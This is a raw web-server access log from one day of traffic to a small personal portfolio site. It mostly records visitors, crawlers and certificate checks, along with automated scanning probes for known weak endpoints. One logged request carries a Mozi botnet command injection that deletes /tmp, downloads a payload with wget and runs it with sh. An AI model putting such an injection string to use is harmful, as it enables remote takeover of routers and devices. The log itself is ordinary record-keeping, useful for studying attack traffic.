107.77.94.55 - - [07/Oct/2020:15:14:04 +0000] "GET /projects HTTP/1.1" 301 584 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
68.67.247.40 - - [07/Oct/2020:16:52:06 +0000] "GET /favicon.ico HTTP/1.1" 404 497 "http://blaqoutdesigns.com/projects/tribute/tribute.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
176.113.115.214 - - [07/Oct/2020:16:54:02 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.239.222 - - [07/Oct/2020:16:56:26 +0000] "GET / HTTP/1.1" 200 1304 "-" "Mozilla/5.0 zgrab/0.x"
154.72.152.58 - - [07/Oct/2020:17:09:25 +0000] "GET / HTTP/1.1" 200 2682 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
176.113.115.214 - - [07/Oct/2020:17:23:05 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
176.113.115.214 - - [07/Oct/2020:17:31:08 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.108.109 - - [07/Oct/2020:18:33:46 +0000] "GET / HTTP/1.1" 200 1323 "-" "Mozilla/5.0"
192.99.149.195 - - [07/Oct/2020:18:38:32 +0000] "GET /wp-login.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
3.128.26.105 - - [07/Oct/2020:19:12:22 +0000] "GET /.well-known/acme-challenge/1EeQzSoXGCOaSVfxcEg5b_50qc6PWqTni7ut_OPpEIg HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.128.26.105 - - [07/Oct/2020:19:12:22 +0000] "GET /.well-known/acme-challenge/2rMOWo42UyQvcNlzburMuCfnTtiiVtq1HF4I5BUVAAc HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
34.211.6.84 - - [07/Oct/2020:19:12:22 +0000] "GET /.well-known/acme-challenge/2rMOWo42UyQvcNlzburMuCfnTtiiVtq1HF4I5BUVAAc HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.196.96.172 - - [07/Oct/2020:19:12:23 +0000] "GET /.well-known/acme-challenge/1EeQzSoXGCOaSVfxcEg5b_50qc6PWqTni7ut_OPpEIg HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
34.211.6.84 - - [07/Oct/2020:19:12:23 +0000] "GET /.well-known/acme-challenge/1EeQzSoXGCOaSVfxcEg5b_50qc6PWqTni7ut_OPpEIg HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
64.78.149.164 - - [07/Oct/2020:19:12:23 +0000] "GET /.well-known/acme-challenge/1EeQzSoXGCOaSVfxcEg5b_50qc6PWqTni7ut_OPpEIg HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
64.78.149.164 - - [07/Oct/2020:19:12:23 +0000] "GET /.well-known/acme-challenge/2rMOWo42UyQvcNlzburMuCfnTtiiVtq1HF4I5BUVAAc HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
52.28.236.88 - - [07/Oct/2020:19:12:23 +0000] "GET /.well-known/acme-challenge/2rMOWo42UyQvcNlzburMuCfnTtiiVtq1HF4I5BUVAAc HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
107.77.236.22 - - [07/Oct/2020:19:19:54 +0000] "GET /index.html HTTP/1.1" 200 5145 "http://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
107.77.236.22 - - [07/Oct/2020:19:20:03 +0000] "GET / HTTP/1.1" 200 1943 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
107.77.236.22 - - [07/Oct/2020:19:22:13 +0000] "GET /projects/projects.html HTTP/1.1" 200 2226 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
64.41.200.102 - - [07/Oct/2020:19:23:27 +0000] "GET / HTTP/1.1" 200 6118 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
64.41.200.102 - - [07/Oct/2020:19:23:29 +0000] "GET /?SSL_Labs_Renegotiation_Test=User_Agent_May_Not_Show HTTP/1.0" 400 3532 "-" "-"
64.41.200.102 - - [07/Oct/2020:19:23:31 +0000] "GET /?SSL_Labs_Renegotiation_Test=User_Agent_May_Not_Show HTTP/1.0" 400 3089 "-" "-"
107.77.94.55 - - [07/Oct/2020:19:32:02 +0000] "GET / HTTP/1.1" 301 583 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
107.77.236.22 - - [07/Oct/2020:19:32:02 +0000] "GET / HTTP/1.1" 200 5145 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
107.77.236.22 - - [07/Oct/2020:19:32:03 +0000] "GET /favicon.ico HTTP/1.1" 404 519 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
107.77.94.55 - - [07/Oct/2020:19:32:53 +0000] "-" 408 0 "-" "-"
107.77.90.95 - - [07/Oct/2020:19:34:20 +0000] "GET / HTTP/1.1" 301 583 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:21 +0000] "GET / HTTP/1.1" 200 5145 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:21 +0000] "GET /favicon.ico HTTP/1.1" 404 4281 "https://blaqoutdesigns.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:28 +0000] "GET /projects/projects.html HTTP/1.1" 200 5428 "https://blaqoutdesigns.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:28 +0000] "GET /favicon.ico HTTP/1.1" 404 4281 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:33 +0000] "GET /projects/survey/form.html HTTP/1.1" 200 5647 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:34:33 +0000] "GET /favicon.ico HTTP/1.1" 404 4281 "https://blaqoutdesigns.com/projects/survey/form.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:57:24 +0000] "GET /projects/projects.html HTTP/1.1" 200 5428 "https://blaqoutdesigns.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:57:25 +0000] "GET /favicon.ico HTTP/1.1" 404 4281 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
73.138.221.46 - - [07/Oct/2020:19:57:43 +0000] "GET / HTTP/1.1" 301 583 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
73.138.221.46 - - [07/Oct/2020:19:57:43 +0000] "GET / HTTP/1.1" 200 5130 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
107.77.235.41 - - [07/Oct/2020:19:57:48 +0000] "GET /projects/specs/specs.html HTTP/1.1" 200 5584 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.235.41 - - [07/Oct/2020:19:57:48 +0000] "GET /favicon.ico HTTP/1.1" 404 4281 "https://blaqoutdesigns.com/projects/specs/specs.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
107.77.236.22 - - [07/Oct/2020:19:57:51 +0000] "GET /projects/projects.html HTTP/1.1" 200 5428 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
107.77.236.22 - - [07/Oct/2020:19:57:52 +0000] "GET /projects/survey/form.html HTTP/1.1" 200 1885 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
34.65.223.42 - - [07/Oct/2020:19:58:06 +0000] "OPTIONS / HTTP/1.0" 200 3474 "-" "-"
107.77.236.22 - - [07/Oct/2020:19:58:11 +0000] "-" 408 3761 "-" "-"
107.77.94.55 - - [07/Oct/2020:20:06:12 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "http://54.82.151.193/projects/projects.html" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
107.77.236.22 - - [07/Oct/2020:20:06:20 +0000] "GET / HTTP/1.1" 200 5145 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
107.77.236.22 - - [07/Oct/2020:20:06:21 +0000] "GET /favicon.ico HTTP/1.1" 404 519 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-N920A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
107.23.70.185 - - [07/Oct/2020:20:08:28 +0000] "GET / HTTP/1.1" 200 1306 "-" "Mozilla/5.0 zgrab/0.x"
107.23.70.185 - - [07/Oct/2020:20:22:00 +0000] "GET / HTTP/1.1" 200 4420 "-" "Mozilla/5.0 zgrab/0.x"
192.241.235.244 - - [07/Oct/2020:20:24:48 +0000] "GET / HTTP/1.1" 200 4420 "-" "Mozilla/5.0 zgrab/0.x"
51.81.253.219 - - [07/Oct/2020:21:10:37 +0000] "GET http://169.254.169.254/latest/meta-data/ HTTP/1.1" 404 4205 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
128.14.133.58 - - [07/Oct/2020:21:30:03 +0000] "GET /solr/ HTTP/1.1" 404 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
102.165.30.17 - - [07/Oct/2020:21:32:53 +0000] "GET / HTTP/1.0" 301 546 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
80.82.68.18 - - [07/Oct/2020:22:16:06 +0000] "GET / HTTP/1.1" 200 2686 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
80.82.68.18 - - [07/Oct/2020:22:16:18 +0000] "GET /favicon.ico HTTP/1.1" 404 464 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
80.82.68.18 - - [07/Oct/2020:22:16:18 +0000] "GET /robots.txt HTTP/1.1" 404 464 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:55:18 +0000] "GET /template/template.cgi HTTP/1.1" 404 4281 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:03 +0000] "GET /template/ HTTP/1.1" 404 1079 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:11 +0000] "GET / HTTP/1.1" 200 1943 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:14 +0000] "GET /projects/projects.html HTTP/1.1" 200 1666 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:16 +0000] "GET /links/VideoLinks_01.html HTTP/1.1" 404 519 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:58 +0000] "GET /links/VideoLinks_01.html HTTP/1.1" 200 2026 "https://blaqoutdesigns.com/projects/projects.html" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:56:58 +0000] "GET /images/Electric-Guitar-HD-Pictures.jpg HTTP/1.1" 200 519392 "https://blaqoutdesigns.com/links/VideoLinks_01.html" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:57:12 +0000] "GET /links/links.html HTTP/1.1" 200 1522 "https://blaqoutdesigns.com/" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:58:09 +0000] "GET /templates/template.cgi HTTP/1.1" 200 1430 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:22:59:04 +0000] "GET /templates/template.cgi HTTP/1.1" 200 1431 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
193.174.89.19 - - [07/Oct/2020:23:15:22 +0000] "GET /connector.sds HTTP/1.1" 404 3551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
193.174.89.19 - - [07/Oct/2020:23:15:23 +0000] "GET /gui/status HTTP/1.1" 404 3551 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
75.183.93.91 - - [07/Oct/2020:23:20:22 +0000] "GET /templates/template.cgi HTTP/1.1" 304 3964 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
88.153.191.107 - - [07/Oct/2020:23:22:29 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 872 "-" "-"
75.183.93.91 - - [07/Oct/2020:23:51:03 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 301 623 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:23:51:04 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 404 4281 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:23:51:24 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 404 1079 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-T377A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
75.183.93.91 - - [07/Oct/2020:23:52:02 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 403 495 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:03:13 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 404 1079 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:04:13 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 403 4284 "-" "Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:04:17 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 403 522 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.94.55 - - [08/Oct/2020:00:04:33 +0000] "GET /cgi-bin/ HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.94.55 - - [08/Oct/2020:00:04:45 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 403 495 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.94.55 - - [08/Oct/2020:00:05:29 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 500 809 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.94.55 - - [08/Oct/2020:00:07:12 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 301 623 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:07:13 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 500 4598 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:10:03 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 500 1396 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:14:57 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 500 1396 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
107.77.236.22 - - [08/Oct/2020:00:16:07 +0000] "GET /cgi-bin/template.cgi HTTP/1.1" 500 4598 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
